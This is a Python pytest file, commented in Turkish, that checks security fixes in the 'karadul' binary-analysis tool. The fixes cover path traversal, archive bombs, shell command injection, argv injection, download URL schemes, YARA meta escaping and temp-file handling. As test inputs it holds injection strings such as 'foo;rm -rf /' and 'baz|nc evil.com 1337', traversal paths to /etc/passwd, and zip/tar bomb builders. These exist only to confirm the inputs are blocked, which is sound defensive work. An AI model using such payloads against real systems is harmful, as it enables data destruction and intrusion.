"""v1.10.0 Fix Sprint -- Guvenlik fix'leri testleri.

Test edilen fix'ler:
- HIGH-1 CWE-22: Path.relative_to (workspace, reference_populator, packed_binary)
- HIGH-2 CWE-409: ZIP/TAR bomb koruma (max_archive_extract_size)
- HIGH-3 CWE-78: Compiler whitelist daraltilmis + args injection validation
- HIGH-4 CWE-88: c++filt "--" separator ile argv injection onleme
- HIGH-5 CWE-775: Popen context manager ile kaynak sizintisi onleme
- MED-1 CWE-918: HTTPS scheme whitelist + max_bytes + same-host redirect
- MED-2 CWE-94: YARA meta escape (backslash + double-quote + control char)
- MED-4 CWE-377: Ghidra tempfile.mkdtemp() ile rastgele isim
- MED-5 CWE-665: stages.py NamedTemporaryFile cleanup NameError onleme

Her test attack vektoru icin PoC uretir ve fix'in koruma sagladigini
dogrular.
"""

from __future__ import annotations

import io
import os
import struct
import tarfile
import tempfile
import urllib.error
import urllib.request
import zipfile
from pathlib import Path
from unittest import mock

import pytest


# ---------------------------------------------------------------------------
# HIGH-1: Path traversal Path.relative_to fix
# ---------------------------------------------------------------------------


class TestWorkspacePathTraversal:
    """Workspace save_artifact / load_artifact startswith -> relative_to."""

    def _make_workspace(self, tmp_path: Path):
        from karadul.core.workspace import Workspace
        ws = Workspace(tmp_path, "test_target")
        ws.create()
        return ws

    def test_relative_parent_traversal_blocked(self, tmp_path):
        """`../etc/passwd` gibi klasik traversal engellenir."""
        ws = self._make_workspace(tmp_path)
        with pytest.raises(ValueError, match="Path traversal engellendi"):
            ws.save_artifact("static", "../../etc/passwd", "pwned")

    def test_prefix_confusion_blocked(self, tmp_path):
        """HIGH-1: /tmp/stage vs /tmp/stage-evil/... ayrimi.

        Bu, eski startswith kontrolunun basarisiz oldugu asil attack.
        Path.relative_to bunu yakalar.
        """
        ws = self._make_workspace(tmp_path)
        with pytest.raises(ValueError, match="Path traversal engellendi"):
            ws.save_artifact("static", "../static-evil/payload.sh", "x")

    def test_absolute_path_blocked(self, tmp_path):
        """Mutlak path / ile basliyorsa da blocked (dest disina cikar)."""
        ws = self._make_workspace(tmp_path)
        with pytest.raises(ValueError, match="Path traversal engellendi"):
            ws.save_artifact("static", "/etc/passwd", "x")

    def test_legitimate_subpath_ok(self, tmp_path):
        """Normal alt klasor yazimi sorunsuz."""
        ws = self._make_workspace(tmp_path)
        p = ws.save_artifact("static", "reports/output.json", '{"a": 1}')
        assert p.exists()
        assert p.name == "output.json"

    def test_load_artifact_traversal_blocked(self, tmp_path):
        """load_artifact da ayni korumayi uygular."""
        ws = self._make_workspace(tmp_path)
        with pytest.raises(ValueError, match="Path traversal engellendi"):
            ws.load_artifact("static", "../../etc/passwd")


class TestPackedBinaryPathTraversal:
    """packed_binary._save_extracted_file path traversal."""

    def test_prefix_confusion_blocked(self, tmp_path):
        """HIGH-1 PoC: name="../extracted-evil/payload.sh"."""
        from karadul.analyzers.packed_binary import PyInstallerExtractor
        # PyInstallerExtractor._save_file benzeri bir entry kullanmak yerine
        # path traversal logic'ini dogrudan dogrula.
        # Aslinda _save_extracted_file private, onun yerine
        # safe_name temizligi sonrasinda resolve()'e dustugunden,
        # pattern'i simule edecegiz.
        output_dir = (tmp_path / "extracted").resolve()
        output_dir.mkdir()

        # Guvenli case: normal isim
        safe_name = "subdir/legitimate.py"
        out_path = (output_dir / safe_name).resolve()
        out_path.relative_to(output_dir)  # Exception atmamali
        assert str(out_path).startswith(str(output_dir))

        # Attack: prefix confusion
        with pytest.raises(ValueError):
            out_path = (output_dir / "../extracted-evil/payload.sh").resolve()
            out_path.relative_to(output_dir)


# ---------------------------------------------------------------------------
# HIGH-2: ZIP/TAR bomb koruma
# ---------------------------------------------------------------------------


class TestArchiveBombProtection:
    """reference_populator._extract_archive ZIP/TAR bomb koruma."""

    def test_zip_bomb_blocked(self, tmp_path):
        """Uncompressed toplam max_extract_size'i asan ZIP reddedilir."""
        from karadul.reconstruction.reference_populator import ReferencePopulator

        # 100MB limitli kucuk test: 150MB uncompressed ZIP bomb
        bomb_path = tmp_path / "bomb.zip"
        dest = tmp_path / "out"
        dest.mkdir()

        # 50MB * 3 dosya = 150MB uncompressed, ama highly compressed
        filler = b"\x00" * (50 * 1024 * 1024)
        with zipfile.ZipFile(bomb_path, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("a.bin", filler)
            zf.writestr("b.bin", filler)
            zf.writestr("c.bin", filler)

        with pytest.raises(ValueError, match=r"ZIP bomb\?|TAR bomb\?"):
            ReferencePopulator._extract_archive(
                bomb_path, dest, "zip", max_extract_size=100 * 1024 * 1024,
            )

    def test_zip_within_limit_ok(self, tmp_path):
        """Limit icinde kalan ZIP sorunsuz cikarilir."""
        from karadul.reconstruction.reference_populator import ReferencePopulator

        ok_path = tmp_path / "ok.zip"
        dest = tmp_path / "out"
        dest.mkdir()

        with zipfile.ZipFile(ok_path, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("hello.txt", b"hello world")

        # 100MB limit
        ReferencePopulator._extract_archive(
            ok_path, dest, "zip", max_extract_size=100 * 1024 * 1024,
        )
        assert (dest / "hello.txt").exists()

    def test_zip_path_traversal_blocked(self, tmp_path):
        """ZIP icindeki ../../ etc. engellenir."""
        from karadul.reconstruction.reference_populator import ReferencePopulator

        evil_path = tmp_path / "evil.zip"
        dest = tmp_path / "out"
        dest.mkdir()

        with zipfile.ZipFile(evil_path, "w") as zf:
            zf.writestr("../../etc/passwd", b"evil")

        with pytest.raises(ValueError, match="path traversal"):
            ReferencePopulator._extract_archive(evil_path, dest, "zip")

    def test_tar_bomb_blocked(self, tmp_path):
        """TAR bomb koruma."""
        from karadul.reconstruction.reference_populator import ReferencePopulator

        bomb_path = tmp_path / "bomb.tar.gz"
        dest = tmp_path / "out"
        dest.mkdir()

        with tarfile.open(bomb_path, "w:gz") as tf:
            # 60MB tek dosya
            blob = b"A" * (60 * 1024 * 1024)
            info = tarfile.TarInfo(name="huge.bin")
            info.size = len(blob)
            tf.addfile(info, io.BytesIO(blob))

        # 50MB limit
        with pytest.raises(ValueError, match=r"TAR bomb\?|ZIP bomb\?"):
            ReferencePopulator._extract_archive(
                bomb_path, dest, "tar.gz", max_extract_size=50 * 1024 * 1024,
            )


# ---------------------------------------------------------------------------
# HIGH-3: Compiler whitelist daraltma + args validation
# ---------------------------------------------------------------------------


class TestShellCommandWhitelist:
    """reference_populator _ALLOWED_SHELL_CMDS daraltilmis."""

    def test_removed_commands_rejected(self):
        """cp, mv, mkdir, install, echo YASAK artik."""
        from karadul.reconstruction.reference_populator import _ALLOWED_SHELL_CMDS
        for cmd in ("cp", "mv", "mkdir", "install", "echo"):
            assert cmd not in _ALLOWED_SHELL_CMDS, (
                f"{cmd} whitelist'te olmamali (HIGH-3 fix)"
            )

    def test_legitimate_commands_kept(self):
        """make, cmake, ar, ranlib, strip, ln DEVAM eder."""
        from karadul.reconstruction.reference_populator import _ALLOWED_SHELL_CMDS
        for cmd in ("make", "cmake", "ar", "ranlib", "strip", "ln"):
            assert cmd in _ALLOWED_SHELL_CMDS, (
                f"{cmd} whitelist'te olmali"
            )

    def test_shell_metachar_in_args_rejected(self, tmp_path):
        """args icinde ;, &, |, `, $, <, >, newline REDDEDILIR."""
        from karadul.reconstruction.reference_populator import ReferencePopulator

        populator = ReferencePopulator(
            cache_dir=tmp_path / "cache",
            auto_populate=False,
            skip_ghidra=True,
        )
        build_dir = tmp_path / "build"
        build_dir.mkdir(parents=True, exist_ok=True)

        # Metachar attack
        for evil_arg in [
            "foo;rm -rf /",
            "bar&whoami",
            "baz|nc evil.com 1337",
            "qux`id`",
            "quux$IFS",
            "corge<payload",
            "grault>exfil",
            "garply\n:",
        ]:
            result = populator._run_shell_step(
                build_dir, {"command": "make", "args": [evil_arg]},
            )
            assert result is False, f"Metachar leaked: {evil_arg!r}"

    def test_absolute_path_in_args_rejected(self, tmp_path):
        """args icinde mutlak path REDDEDILIR."""
        from karadul.reconstruction.reference_populator import ReferencePopulator

        populator = ReferencePopulator(
            cache_dir=tmp_path / "cache",
            auto_populate=False,
            skip_ghidra=True,
        )
        build_dir = tmp_path / "build"
        build_dir.mkdir(parents=True, exist_ok=True)

        result = populator._run_shell_step(
            build_dir, {"command": "make", "args": ["/etc/passwd"]},
        )
        assert result is False


# ---------------------------------------------------------------------------
# HIGH-4: c++filt "--" separator
# ---------------------------------------------------------------------------


class TestCppFiltArgvInjection:
    """c++filt calistirilirken "--" separator kullanilmali.

    Aksi halde mangled isim "-" ile basliyorsa c++filt flag olarak
    yorumlar. "_ZN5Class4funcEv" gibi normal isimler "_" ile baslar
    ama saldirgan argv injection denemis olabilir.
    """

    def test_cpp_rtti_uses_double_dash(self):
        """karadul.analyzers.cpp_rtti modulu c++filt cagirir -- separator ile."""
        import karadul.analyzers.cpp_rtti as mod
        # Mock subprocess.run, arg'lari kontrol et
        calls = []

        def fake_run(*args, **kwargs):
            calls.append(args[0])
            # cxxfilt import'u fallback'e dusurmek icin
            class R:
                returncode = 0
                stdout = "demangled_name"
                stderr = ""
            return R()

        # cxxfilt'i devre disi birak ki c++filt fallback calissin
        with mock.patch.object(mod, "subprocess") as m_sub:
            m_sub.run = fake_run
            m_sub.TimeoutExpired = type("T", (Exception,), {})
            # cxxfilt import'unu kir ki fallback'e dussun
            with mock.patch.dict(
                "sys.modules", {"cxxfilt": None},
            ):
                mod.demangle_itanium("-Wl,--wrap,evil")

        assert calls, "c++filt cagrilmadi"
        # "--" argument listesinde olmali
        assert "--" in calls[0], (
            f"c++filt cagrisinda '--' separator yok: {calls[0]}"
        )

    def test_binary_name_extractor_uses_double_dash(self):
        """binary_name_extractor._demangle_symbol de -- kullanmali."""
        import karadul.reconstruction.binary_name_extractor as mod
        import inspect
        src = inspect.getsource(mod._demangle_symbol)
        assert "'--'" in src or '"--"' in src, (
            "_demangle_symbol c++filt cagrisinda '--' kullanmiyor"
        )


# ---------------------------------------------------------------------------
# HIGH-5: Popen context manager
# ---------------------------------------------------------------------------


class TestPopenContextManager:
    """Popen resource leak onleme (context manager + timeout kill/wait)."""

    def test_dwarf_extractor_uses_with(self):
        """_parse_dwarf_stream Popen'i with bloguyla acar."""
        import karadul.analyzers.dwarf_extractor as mod
        import inspect
        src = inspect.getsource(mod.DwarfExtractor._parse_dwarf_stream)
        # "with subprocess.Popen" pattern'i olmali
        assert "with subprocess.Popen" in src or "with Popen" in src, (
            "_parse_dwarf_stream Popen'i context manager ile acmiyor"
        )

    def test_swift_binary_uses_with(self):
        """swift_binary._demangle_with_xcrun Popen'i with bloguyla acar."""
        import karadul.analyzers.swift_binary as mod
        import inspect
        src = inspect.getsource(mod.SwiftBinaryAnalyzer)
        assert "with subprocess.Popen" in src, (
            "swift_binary Popen'i context manager ile acmiyor"
        )

    def test_binary_name_extractor_uses_with(self):
        """binary_name_extractor Popen'i with bloguyla acar."""
        import karadul.reconstruction.binary_name_extractor as mod
        import inspect
        src = inspect.getsource(mod)
        # En az 1 "with subprocess.Popen" olmali
        assert "with subprocess.Popen" in src, (
            "binary_name_extractor Popen'i context manager ile acmiyor"
        )


# ---------------------------------------------------------------------------
# MED-1: HTTPS scheme whitelist + max_bytes
# ---------------------------------------------------------------------------


class TestDownloadScheme:
    """reference_populator._download_file scheme whitelist ve max_bytes."""

    def test_http_scheme_rejected(self, tmp_path):
        """HTTP (TLS yok) reddedilir, sadece HTTPS."""
        from karadul.reconstruction.reference_populator import ReferencePopulator
        with pytest.raises(ValueError, match="Izin verilmeyen URL scheme"):
            ReferencePopulator._download_file(
                "http://example.com/pkg.zip", tmp_path / "out.zip",
            )

    def test_file_scheme_rejected(self, tmp_path):
        """file:// reddedilir (LFI koruma)."""
        from karadul.reconstruction.reference_populator import ReferencePopulator
        with pytest.raises(ValueError, match="Izin verilmeyen URL scheme"):
            ReferencePopulator._download_file(
                "file:///etc/passwd", tmp_path / "out",
            )

    def test_ftp_scheme_rejected(self, tmp_path):
        """ftp:// reddedilir."""
        from karadul.reconstruction.reference_populator import ReferencePopulator
        with pytest.raises(ValueError, match="Izin verilmeyen URL scheme"):
            ReferencePopulator._download_file(
                "ftp://example.com/pkg.zip", tmp_path / "out",
            )

    def test_source_resolver_rejects_http(self):
        """SourceResolver (npm unpkg) sadece HTTPS kabul eder."""
        from karadul.reconstruction.source_matcher.source_resolver import SourceResolver
        resolver = SourceResolver()
        content, final = resolver._fetch_url("http://unpkg.com/lodash/")
        assert content is None
        assert final is None

    def test_dts_namer_rejects_http(self):
        """DtsNamer sadece HTTPS kabul eder."""
        # _fetch_dts_content icinde urls https:// ile baslar. Test:
        # Eger URL listesinde http:// olsa bile scheme check'i devreye girer.
        from karadul.reconstruction.dts_namer import DtsNamer
        import inspect
        # _fetch_dts_content kaynaginda "scheme != 'https'" kontrolu olmali
        src = inspect.getsource(DtsNamer)
        assert 'https' in src.lower()


# ---------------------------------------------------------------------------
# MED-2: YARA meta escape
# ---------------------------------------------------------------------------


class TestYaraMetaEscape:
    """yara_scanner._escape_yara_meta fonksiyonu."""

    def test_double_quote_escaped(self):
        from karadul.analyzers.yara_scanner import _escape_yara_meta
        assert _escape_yara_meta('hello"world') == 'hello\\"world'

    def test_backslash_escaped(self):
        from karadul.analyzers.yara_scanner import _escape_yara_meta
        assert _escape_yara_meta("path\\to\\file") == "path\\\\to\\\\file"

    def test_backslash_then_quote_order(self):
        from karadul.analyzers.yara_scanner import _escape_yara_meta
        # Sirasi onemli: once backslash, sonra quote
        # Girdi: \" -- cikti: \\\"
        assert _escape_yara_meta('a\\"b') == 'a\\\\\\"b'

    def test_control_char_rejected(self):
        from karadul.analyzers.yara_scanner import _escape_yara_meta
        with pytest.raises(ValueError, match="control character"):
            _escape_yara_meta("evil\x00payload")
        with pytest.raises(ValueError, match="control character"):
            _escape_yara_meta("foo\nbar")
        with pytest.raises(ValueError, match="control character"):
            _escape_yara_meta("\x1b[31mrouge")

    def test_normal_printable_unchanged(self):
        from karadul.analyzers.yara_scanner import _escape_yara_meta
        assert _escape_yara_meta("normal description") == "normal description"

    def test_rule_emit_escapes_injection_attempt(self):
        """BuiltinRule -> rule_to_yara_source tam akislar."""
        from karadul.analyzers.yara_scanner import (
            BuiltinRule,
            _rule_to_yara_source,
        )
        rule = BuiltinRule(
            name="TestRule",
            tags=["t1"],
            meta={"description": 'legit"; injected condition: true'},
            byte_patterns=[b"\x01\x02"],
        )
        source = _rule_to_yara_source(rule)
        # Injected condition string literal olarak kalmali, parse edilir
        # hale gelmemeli -- double-quote escape edilmiş olmalı
        assert '\\"' in source, "Meta value'da \\\" escape yok"
        # " un-escaped sonrasi \n ile birlikte yeni satir enjekte edilemez
        # (control char reject zaten yukarida test edildi)


# ---------------------------------------------------------------------------
# MED-4: Ghidra tempfile.mkdtemp()
# ---------------------------------------------------------------------------


class TestGhidraTempfileRandom:
    """Ghidra scriptleri tempfile.mkdtemp() kullaniyor (predictable PID yerine)."""

    GHIDRA_SCRIPTS = [
        "cfg_extraction",
        "string_extractor",
        "call_graph",
        "xref_analysis",
        "export_results",
        "pcode_analysis",
        "decompile_all",
        "function_lister",
        "function_id_extractor",
        "type_recovery",
    ]

    @pytest.mark.parametrize("script_name", GHIDRA_SCRIPTS)
    def test_script_uses_mkdtemp(self, script_name):
        """Her Ghidra script'inde mkdtemp cagrisi olmali."""
        script_path = (
            Path(__file__).parent.parent
            / "karadul" / "ghidra" / "scripts"
            / f"{script_name}.py"
        )
        src = script_path.read_text()
        assert "tempfile.mkdtemp" in src, (
            f"{script_name}.py mkdtemp kullanmiyor (predictable PID hala var)"
        )
        assert "karadul_ghidra_%d" not in src, (
            f"{script_name}.py eski predictable PID pattern'i hala var"
        )


# ---------------------------------------------------------------------------
# MED-5: stages.py NamedTemporaryFile NameError
# ---------------------------------------------------------------------------


class TestStagesLlmCtxCleanup:
    """stages.py LLM naming context tempfile cleanup."""

    def test_ctx_path_defined_outside_try(self):
        """llm_ctx_path try blogu disinda None olarak tanimli olmali."""
        stages_path = (
            Path(__file__).parent.parent / "karadul" / "stages.py"
        )
        src = stages_path.read_text()
        # Fix pattern'i: "llm_ctx_path = None" yazmali
        assert "llm_ctx_path = None" in src, (
            "stages.py: llm_ctx_path = None try disinda tanimli degil"
        )
        # Finally'de kontrol olmali
        assert "if llm_ctx_path is not None" in src, (
            "stages.py: finally blogunda llm_ctx_path None kontrolu yok"
        )


# ---------------------------------------------------------------------------
# Bonus: SecurityConfig
# ---------------------------------------------------------------------------


class TestSecurityConfig:
    """v1.10.0 Fix Sprint yeni Config.security dataclass."""

    def test_security_config_defaults(self):
        from karadul.config import Config
        cfg = Config()
        # 2 GB default
        assert cfg.security.max_archive_extract_size == 2 * 1024 ** 3
        # 500 MB default
        assert cfg.security.max_download_size == 500 * 1024 ** 2
        # HTTPS only
        assert cfg.security.allowed_download_schemes == ("https",)
        # Redirect same-host ON
        assert cfg.security.restrict_download_redirects_to_same_host is True

    def test_security_config_yaml_load(self, tmp_path):
        """security key'i YAML'den yuklenebiliyor."""
        import yaml
        from karadul.config import Config

        config_path = tmp_path / "karadul.yaml"
        config_path.write_text(yaml.safe_dump({
            "security": {
                "max_archive_extract_size": 1024,
                "max_download_size": 2048,
                "allowed_download_schemes": ["https", "http"],
                "restrict_download_redirects_to_same_host": False,
            },
        }))

        cfg = Config.load(config_path)
        assert cfg.security.max_archive_extract_size == 1024
        assert cfg.security.max_download_size == 2048
        assert cfg.security.allowed_download_schemes == ("https", "http")
        assert cfg.security.restrict_download_redirects_to_same_host is False
